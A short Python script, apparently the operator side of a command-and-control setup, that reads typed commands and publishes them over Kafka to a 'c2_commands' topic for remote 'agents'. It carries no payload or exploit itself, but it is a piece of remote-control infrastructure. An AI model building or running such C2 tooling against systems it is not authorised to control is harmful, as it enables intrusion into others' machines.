from kafka import KafkaProducer
from config import Config


KAFKA_BROKER = 'localhost:9092'
KAFKA_TOPIC_AS_PRODUCER = 'c2_commands'
KAFKA_TOPIC_AS_CONSUMER = 'agent_response'

producer = KafkaProducer(**Config)

def callback(command):
    print(f"-> {command.value.decode('utf-8')} Delivered Succesfully!!!!")

def send_commands():
    try:
        while True:
            command = input('Give command to the agents ')
            future = producer.send(KAFKA_TOPIC_AS_PRODUCER,value=command.encode('utf-8'))
            future.add_callback(callback)
            print(f'-> {command} sent to {KAFKA_TOPIC_AS_PRODUCER} topic.....')
    except KeyboardInterrupt:
        print('Interrupted by User')
    finally:
        producer.flush()

if __name__ == '__main__':
    send_commands()